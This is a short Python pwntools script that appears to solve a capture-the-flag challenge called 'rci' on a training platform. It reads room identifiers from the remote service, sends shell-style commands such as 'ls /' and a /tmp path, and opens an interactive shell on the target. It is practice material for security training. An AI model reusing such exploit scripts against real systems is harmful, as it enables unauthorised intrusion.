#!/usr/bin/env python
# coding=utf-8
from pwn import *
#context.log_level = 'debug'
context(arch = 'amd64', os = 'linux')


def getroom(r):
    r.recvuntil('R0OM',timeout=0.1)
    num = r.recv(11)
    return 'R0OM'+num



local = 0
if local == 1:
    r=process('./rci')
    #gdb.attach(r,'vmmap')
else:
    r=remote('node3.buuoj.cn',27825)
    
for i in range(47):
    room = getroom(r)
    print getroom(r)
    if i == 4:
        x = room


r.recvuntil('ls')
r.sendline('ls /')
r.recvuntil('Ta')
r.sendline('/tmp/'+x)

r.interactive()